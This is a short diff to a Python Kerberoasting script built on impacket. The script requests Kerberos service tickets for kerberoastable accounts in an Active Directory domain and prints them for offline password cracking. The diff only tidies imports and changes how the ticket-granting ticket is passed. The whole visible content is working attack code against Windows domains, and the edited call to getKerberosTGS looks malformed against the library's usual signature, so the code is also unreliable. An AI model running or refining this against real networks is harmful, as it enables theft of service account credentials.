@@ -1,8 +1,6 @@
 from impacket.smbconnection import SMBConnection
-from impacket.krb5.asn1 import AP_REQ, TGS_REP
 from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
 from impacket.krb5.types import Principal
-from impacket.krb5.ccache import CCache
 from impacket.ntlm import compute_nthash
 
 def kerberoast(username, password, domain, dc_ip):
@@ -26,8 +24,7 @@ def kerberoast(username, password, domain, dc_ip):
                 for account in kerberoastable_accounts:
                     print(account)
                     # Kerberoast each account
-                    krbtgt = krbtgt_ticket['KDC_REP']['ticket']
-                    tgs_rep = getKerberosTGS(krbtgt, str(Principal(account, type=Principal.NT_PRINCIPAL)))
+                    tgs_rep = getKerberosTGS(krbtgt_ticket, str(Principal(account, type=Principal.NT_PRINCIPAL)))
                     print(f"TGS_REP for {account}:")
                     print(tgs_rep.native)
             else:
